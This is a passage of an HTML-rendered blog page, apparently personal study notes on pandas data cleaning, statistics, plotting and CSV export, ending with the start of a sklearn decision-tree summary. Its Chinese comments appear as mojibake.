class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†ç©ºç½®ç‡ä»ä½åˆ°é«˜æ’åº</span></span><br><span class="line">q1_df=q1_df.sort_values(<span class="string">&#x27;AT_HOME&#x27;</span>)</span><br><span class="line"><span class="comment"># å‚æ•°byå¯ä»¥å¿½ç•¥</span></span><br><span class="line">df.sort_values(by=<span class="string">&#x27;æ€»åˆ†&#x27;</span>, ascending=<span class="literal">True</span>).head(<span class="number">20</span>)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„é¡¹å¾—åˆ†æœ€é«˜çš„å­¦æ ¡åç§°</span></span><br><span class="line">df.iloc[:,<span class="number">3</span>:].idxmax()</span><br><span class="line"><span class="comment"># ç»Ÿè®¡ æ€»åˆ† åˆ—çš„å‡å€¼</span></span><br><span class="line">df[<span class="string">&#x27;æ€»åˆ†&#x27;</span>].mean()</span><br><span class="line">df.æ€»åˆ†.mean()</span><br><span class="line"><span class="comment"># è®¡ç®—æ€»åˆ†åˆ—çš„ä¸­ä½æ•°</span></span><br><span class="line">df.æ€»åˆ†.median()</span><br><span class="line"><span class="comment"># è®¡ç®—æ€»åˆ†åˆ—çš„ä¼—æ•°</span></span><br><span class="line">df.æ€»åˆ†.mode()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°å€¼å‹æ•°æ®çš„ç»Ÿè®¡ä¿¡æ¯ï¼ˆå‡å€¼ã€åˆ†ä½æ•°ç­‰ï¼‰ï¼Œå¹¶ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line">df.describe().<span class="built_in">round</span>(<span class="number">2</span>).T</span><br></pre></td></tr></table></figure><h3><span id="åŒçºµåæ ‡è½´">åŒçºµåæ ‡è½´</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥data.csv</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†Dateè½¬ä¸ºæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¼˜åŒ–dfçš„ç»“æ„</span></span><br><span class="line">df=df.reset_index(drop=<span class="literal">True</span>).set_index(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line"><span class="comment"># é€‰æ‹©æ•°æ®èŒƒå›´ 2014å¹´1æœˆ1æ—¥è‡³2018å¹´7æœˆ31æ—¥</span></span><br><span class="line">q1_df = df[<span class="string">&#x27;2014-01-01&#x27;</span>:<span class="string">&#x27;2018-07-31&#x27;</span>]</span><br><span class="line"><span class="comment"># æ„å»ºç”»å›¾ä½¿ç”¨çš„dataframe æ¯å¤©çš„æ—¥ç”µé‡ã€æœ€é«˜æ¸©åº¦ã€æœ€ä½æ¸©åº¦</span></span><br><span class="line">q1_plot_df = q1_df[[<span class="string">&#x27;DailyElectricity&#x27;</span>,<span class="string">&#x27;MaxTemperature&#x27;</span>,<span class="string">&#x27;MinTemperature&#x27;</span>]]</span><br><span class="line"><span class="comment"># ç”»å›¾</span></span><br><span class="line">fig,ax = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(df[<span class="string">&#x27;DailyElectricity&#x27;</span>],color=<span class="string">&#x27;r&#x27;</span>,label=<span class="string">&#x27;DailyElectricity&#x27;</span>)</span><br><span class="line"><span class="comment"># é•œåƒxè½´</span></span><br><span class="line">ax2 = ax.twinx()</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MaxTemperature&#x27;</span>],color=<span class="string">&#x27;b&#x27;</span>,label=<span class="string">&#x27;MaxTemperature&#x27;</span>)</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MinTemperature&#x27;</span>],color=<span class="string">&#x27;g&#x27;</span>,label=<span class="string">&#x27;MinTemperature&#x27;</span>)</span><br><span class="line"><span class="comment"># æ·»åŠ å›¾ä¾‹</span></span><br><span class="line">ax.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax2.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Usage and Temperature&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;F-1.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ„å»ºç©ºdf">æ„å»ºç©ºDF</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">max_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line">min_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(q4_df)):</span><br><span class="line">    indx = q4_df.index[i][<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    val = q4_df.iloc[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street A&#x27;</span>:</span><br><span class="line">        max_data = max_data.append([&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;],ignore_index=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street G&#x27;</span>:</span><br><span class="line">        min_data = min_data.append(&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;,ignore_index=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">min_data=min_data.reset_index(drop=<span class="literal">True</span>).set_index(min_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ–°å»ºdf æ–¹æ³•ä¸€</span></span><br><span class="line"></span><br><span class="line">cols_q3=[<span class="string">&#x27;ç±»åˆ«&#x27;</span>,<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ç¯æ¯”æå‡&#x27;</span>,<span class="string">&#x27;å†œå†åŒæœŸå‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;åŒæ¯”æå‡&#x27;</span>]</span><br><span class="line">q3_df = pd.DataFrame(columns=cols_q3)</span><br><span class="line">q3_df.loc[<span class="number">0</span>]=np.nan <span class="comment">#å…ˆæ–°å»ºä¸€åˆ—</span></span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;è½¯ä»¶å›­ä¸€æœŸ&#x27;</span> <span class="comment"># ç¬¬ä¸€æ¬¡è¦iloc</span></span><br><span class="line">q3_df.loc[<span class="number">1</span>] = <span class="string">&#x27;è½¯ä»¶å›­äºŒæœŸ&#x27;</span>   <span class="comment"># åé¢å¯ä»¥ç”¨ilocæ¥åš</span></span><br><span class="line">q3_df.loc[<span class="number">2</span>] = <span class="string">&#x27;è½¯ä»¶å›­ä¸‰æœŸ&#x27;</span></span><br><span class="line">q3_df.loc[<span class="number">3</span>] = <span class="string">&#x27;åŒ»è¯åˆ¶é€ &#x27;</span>q3_df.iloc[<span class="number">0</span>,<span class="number">1</span>] = bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">2</span>] = sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">3</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>])/sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">4</span>] = nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">5</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>])/nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># æ–°å»ºdf æ–¹æ³•äºŒç›´æ¥concat</span></span><br><span class="line">q1_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line">tmp_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;å·¥ä¸š&#x27;</span></span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span></span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_gy[<span class="string">&#x27;å¼€å·¥æŒ‡æ•°&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_jz[<span class="string">&#x27;å¼€å·¥æŒ‡æ•°&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">q1_df = pd.concat([q1_df,tmp_df],axis=<span class="number">0</span>)</span><br><span class="line">q1_df.to_csv(<span class="string">&#x27;Q2-1.csv&#x27;</span>,index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ä¸€åˆ—æ·»åŠ åˆ°ä¸€ä¸ªæ–°çš„dfé‡Œé¢ï¼Œéœ€è¦ä¿è¯ï¼ï¼ï¼indexä¸€è‡´ï¼ï¼ï¼ å¦åˆ™åŠ ä¸è¿›å»</span></span><br><span class="line"><span class="comment"># q2_df</span></span><br><span class="line">cols_q2 = [<span class="string">&#x27;ç±»åˆ«&#x27;</span>,<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ç¯æ¯”æå‡&#x27;</span>,<span class="string">&#x27;å†œå†åŒæœŸå‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;åŒæ¯”æå‡&#x27;</span>]</span><br><span class="line">q2_df = pd.DataFrame(columns=cols_q2)</span><br><span class="line">q2_df[<span class="string">&#x27;ç±»åˆ«&#x27;</span>]=usage_bz.T.index</span><br><span class="line">q2_df[<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>]=usage_bz.T.reset_index()[<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>] <span class="comment">#è¦å…ˆreset_index</span></span><br><span class="line">q2_df</span><br></pre></td></tr></table></figure><h3><span id="æ›´æ”¹æ—¥æœŸé—´éš”">æ›´æ”¹æ—¥æœŸé—´éš”</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ”¹æ—¥æœŸé—´éš”</span></span><br><span class="line">plt.xticks(pd.date_range(<span class="string">&#x27;2021-01-01&#x27;</span>,<span class="string">&#x27;2021-03-31&#x27;</span>,freq=<span class="string">&#x27;20D&#x27;</span>))</span><br></pre></td></tr></table></figure><h3><span id="æŸ¥çœ‹ç»Ÿè®¡æ•°æ®">æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="ä¿å­˜æ–‡ä»¶">ä¿å­˜æ–‡ä»¶</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸ä¿å­˜ç´¢å¼•</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># ä¿å­˜æŒ‡å®šåˆ—</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># å°æ•°ç‚¹</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># è®¡ç®—ç¼ºå¤±å€¼</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æ¯åˆ—æœ‰å¤šå°‘ç¼ºå¤±å€¼</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç¼ºå¤±å€¼</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨æ•´åˆ—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># ç°åœ¨å°†è¯„åˆ†åˆ—çš„ç¼ºå¤±å€¼ï¼Œæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªç”µå½±çš„è¯„åˆ†</span></span><br><span class="line">df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>] = df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨ä¸Šä¸‹æ•°å­—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># åœ¨å¡«å…… â€œè¯­è¨€â€ åˆ—çš„ç¼ºå¤±å€¼ï¼Œè¦æ±‚æ ¹æ® â€œå›½å®¶/åœ°åŒºâ€ åˆ—çš„å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯­è¨€&#x27;</span>]=df.groupby(<span class="string">&#x27;å›½å®¶/åœ°åŒº&#x27;</span>).è¯­è¨€.bfill()</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾æŒ‡å®šåˆ—çš„é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;ç‰‡å&#x27;</span>])]</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼ï¼Œä½†ä¿ç•™æœ€åä¸€æ¬¡å‡ºç°çš„å€¼first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®—å„çœå¸‚å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">df.çœå¸‚.value_counts()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ½å¯ä»¥ç”¨inplace=Trueæ¥ä»£æ›¿èµ‹å€¼</span></span><br></pre></td></tr></table></figure><h3><span id="åˆ é™¤ç©ºè¡Œ">åˆ é™¤ç©ºè¡Œ</span></h3><p><strong>1.å‡½æ•°è¯¦è§£</strong></p><p>å‡½æ•°å½¢å¼ï¼šdropna(axis&#x3D;0, how&#x3D;â€™anyâ€™, thresh&#x3D;None, subset&#x3D;None, inplace&#x3D;False)</p><p>å‚æ•°ï¼š</p><p><strong>axis</strong>ï¼šè½´ã€‚0æˆ–â€™indexâ€™ï¼Œè¡¨ç¤ºæŒ‰è¡Œåˆ é™¤ï¼›1æˆ–â€™columnsâ€™ï¼Œè¡¨ç¤ºæŒ‰åˆ—åˆ é™¤ã€‚</p><p><strong>how</strong>ï¼šç­›é€‰æ–¹å¼ã€‚â€˜anyâ€™ï¼Œè¡¨ç¤ºè¯¥è¡Œ&#x2F;åˆ—åªè¦æœ‰ä¸€ä¸ªä»¥ä¸Šçš„ç©ºå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ï¼›â€˜allâ€™ï¼Œè¡¨ç¤ºè¯¥è¡Œ&#x2F;åˆ—å…¨éƒ¨éƒ½ä¸ºç©ºå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ã€‚</p><p><strong>thresh</strong>ï¼šéç©ºå…ƒç´ æœ€ä½æ•°é‡ã€‚intå‹ï¼Œé»˜è®¤ä¸ºNoneã€‚å¦‚æœè¯¥è¡Œ&#x2F;åˆ—ä¸­ï¼Œéç©ºå…ƒç´ æ•°é‡å°äºè¿™ä¸ªå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ã€‚</p><p><strong>subset</strong>ï¼šå­é›†ã€‚åˆ—è¡¨ï¼Œå…ƒç´ ä¸ºè¡Œæˆ–è€…åˆ—çš„ç´¢å¼•ã€‚å¦‚æœaxis&#x3D;0æˆ–è€…â€˜indexâ€™ï¼Œsubsetä¸­å…ƒç´ ä¸ºåˆ—çš„ç´¢å¼•ï¼›å¦‚æœaxis&#x3D;1æˆ–è€…â€˜columnâ€™ï¼Œsubsetä¸­å…ƒç´ ä¸ºè¡Œçš„ç´¢å¼•ã€‚ç”±subseté™åˆ¶çš„å­åŒºåŸŸï¼Œæ˜¯åˆ¤æ–­æ˜¯å¦åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—çš„æ¡ä»¶åˆ¤æ–­åŒºåŸŸã€‚</p><p><strong>inplace</strong>ï¼šæ˜¯å¦åŸåœ°æ›¿æ¢ã€‚å¸ƒå°”å€¼ï¼Œé»˜è®¤ä¸ºFalseã€‚å¦‚æœä¸ºTrueï¼Œåˆ™åœ¨åŸDataFrameä¸Šè¿›è¡Œæ“ä½œï¼Œè¿”å›å€¼ä¸ºNoneã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤æ•´è¡Œç¼ºå¤±çš„æ•°æ®ï¼Œå‰©ä½™ç¼ºå¤±æ•°æ®æŒ‰0å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤æŸåˆ—ä¸ºç©ºçš„è¡Œ</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;å®¢æˆ·ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ›¿æ¢">æ›¿æ¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†é‡‘ç‰Œæ•°åˆ—çš„æ•°å­— 0 æ›¿æ¢ä¸º æ— </span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;æ— &#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#åŒæ—¶æ›¿æ¢ 1å°† æ—  æ›¿æ¢ä¸º ç¼ºå¤±å€¼ 2å°† 0 æ›¿æ¢ä¸º None</span></span><br><span class="line">df.replace([<span class="string">&#x27;æ— &#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># å°† `é‡‘ç‰Œæ•°` åˆ—ç±»å‹ä¿®æ”¹ä¸º `int`</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].fillna(<span class="string">&#x27;0&#x27;</span>).astype(<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure><h2><span id="ç®—æ³•æ€»ç»“">ç®—æ³•æ€»ç»“</span></h2><table><thead><tr><th>åˆ†ç±»</th><th>å›å½’</th></tr></thead><tbody><tr><td>åˆ†ç±»æ ‘<strong>tree.DecisionTreeClassififier</strong></td><td>å›å½’æ ‘<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>éšæœºæ£®æ—<strong>ensemble.RandomForestClassifier</strong></td><td>å›å½’æ£®æ—<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>é€»è¾‘å›å½’<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>æ¢¯åº¦æå‡æ ‘æœ¨<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3><span id="å†³ç­–æ ‘">å†³ç­–æ ‘</span></h3><p><strong>å†³ç­–æ ‘ä¼˜ç‚¹</strong></p><ol><li><p>æ˜“äºç†è§£å’Œè§£é‡Šï¼Œå› ä¸ºæ ‘æœ¨å¯ä»¥ç”»å‡ºæ¥è¢«çœ‹è§</p></li><li><p>éœ€è¦å¾ˆå°‘çš„æ•°æ®å‡†å¤‡ã€‚å…¶ä»–å¾ˆå¤šç®—æ³•é€šå¸¸éƒ½éœ€è¦æ•°æ®è§„èŒƒåŒ–ï¼Œéœ€è¦åˆ›å»ºè™šæ‹Ÿå˜é‡å¹¶åˆ é™¤ç©ºå€¼ç­‰ã€‚ä½†è¯·æ³¨æ„ï¼Œsklearnä¸­çš„å†³ç­–æ ‘æ¨¡å—ä¸æ”¯æŒå¯¹ç¼ºå¤±å€¼çš„å¤„ç†ã€‚</p></li><li><p>ä½¿ç”¨æ ‘çš„æˆæœ¬ï¼ˆæ¯”å¦‚è¯´ï¼Œåœ¨é¢„æµ‹æ•°æ®çš„æ—¶å€™ï¼‰æ˜¯ç”¨äºè®­ç»ƒæ ‘çš„æ•°æ®ç‚¹çš„æ•°é‡çš„å¯¹æ•°ï¼Œç›¸æ¯”äºå…¶ä»–ç®—æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆä½çš„æˆæœ¬ã€‚</p></li><li><p>èƒ½å¤ŸåŒæ—¶å¤„ç†æ•°å­—å’Œåˆ†ç±»æ•°æ®ï¼Œæ—¢å¯ä»¥åšå›å½’åˆå¯ä»¥åšåˆ†ç±»ã€‚å…¶ä»–æŠ€æœ¯é€šå¸¸ä¸“é—¨ç”¨äºåˆ†æä»…å…·æœ‰ä¸€ç§å˜é‡ç±»å‹çš„æ•°æ®é›†ã€‚</p></li><li><p>èƒ½å¤Ÿå¤„ç†å¤šè¾“å‡ºé—®é¢˜ï¼Œå³å«æœ‰å¤šä¸ªæ ‡ç­¾çš„é—®é¢˜ï¼Œæ³¨æ„ä¸ä¸€ä¸ªæ ‡ç­¾ä¸­å«æœ‰å¤šç§æ 